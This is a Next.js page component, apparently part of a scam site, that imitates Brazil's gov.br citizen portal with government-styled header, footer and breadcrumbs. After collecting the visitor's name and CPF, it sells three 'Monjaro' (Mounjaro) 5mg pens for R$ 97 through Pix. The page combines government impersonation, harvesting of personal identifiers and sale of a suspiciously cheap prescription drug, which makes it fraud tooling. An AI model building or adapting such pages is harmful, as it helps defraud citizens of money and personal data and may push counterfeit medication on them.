"use client";
import Link from "next/link"
import Image from "next/image"
import { Button } from "@/components/ui/button"
import { GovBrHeader } from "@/components/gov-br-header"
import { GovBrFooter } from "@/components/gov-br-footer"
import { PixPayment } from "@/components/PixPayment"
import { Toaster } from "sonner"
import { useUser } from "@/context/UserContext"

export default function Pagamento() {
  const { setUser, user } = useUser();

  const handlePaymentSuccess = () => {
    // Aqui você pode redirecionar para uma página de sucesso
    // ou atualizar o estado da aplicação
    console.log('Pagamento realizado com sucesso!');
  };

  // Fallback para garantir que nome e cpf estejam preenchidos
  if (!user.name || !user.cpf) {
    return (
      <div className="flex flex-col min-h-screen">
        <GovBrHeader />
        <main className="flex-1 container mx-auto px-4 py-6 flex items-center justify-center">
          <div className="bg-white rounded-lg shadow-sm p-6 max-w-md mx-auto text-center">
            <h2 className="text-lg font-bold mb-2">Dados incompletos</h2>
            <p className="text-gray-600">Por favor, preencha seu nome e CPF nas etapas anteriores.</p>
            <Link href="/verificacao-cpf">
              <Button className="mt-4">Voltar para início</Button>
            </Link>
          </div>
        </main>
        <GovBrFooter />
      </div>
    );
  }

  return (
    <div className="flex flex-col min-h-screen">
      <GovBrHeader />
      <Toaster position="top-center" />

      <main className="flex-1 container mx-auto px-4 py-6">
        <div className="flex items-center text-sm mb-4 text-blue-800">
          <Link href="/" className="hover:underline">
            <span className="inline-flex items-center">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
                className="mr-1"
              >
                <path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" />
                <polyline points="9 22 9 12 15 12 15 22" />
              </svg>
            </span>
          </Link>
          <span className="mx-2">{">"}</span>
          <Link href="/portal-cidadao" className="hover:underline">
            Portal Cidadão
          </Link>
          <span className="mx-2">{">"}</span>
          <Link href="/verificacao-de-acesso" className="hover:underline">
            Verificação de Acesso
          </Link>
          <span className="mx-2">{">"}</span>
          <span className="font-medium">Monjauros</span>
        </div>

        <div className="bg-white rounded-lg shadow-sm p-6 max-w-md mx-auto">
          <div className="mb-6">
            <Image src="/mounjaro-pen.png" alt="Monjaro" width={40} height={80} className="mx-auto" />
          </div>

          <h2 className="text-lg font-bold mb-2 text-center">3x Canetas Monjaro (5mg)</h2>
          <p className="text-2xl font-bold text-blue-800 mb-6 text-center">R$ 97,00</p>

          <PixPayment
            amount={9700}
            customerData={{
              name: user.name,
              cpf: user.cpf
            }}
            onSuccess={handlePaymentSuccess}
          />

          <p className="text-sm text-gray-600 mt-6 text-center">
            Após o pagamento, confirmação será processada e você poderá ser notificado por e-mail ou SMS.
          </p>

          <p className="text-xs text-gray-500 mt-2 text-center">
            Referente à sua solicitação de Monjaro (D.M. Farmácia (VVGLLC) bvsd33aa)
          </p>
        </div>
      </main>

      <GovBrFooter />
    </div>
  )
}
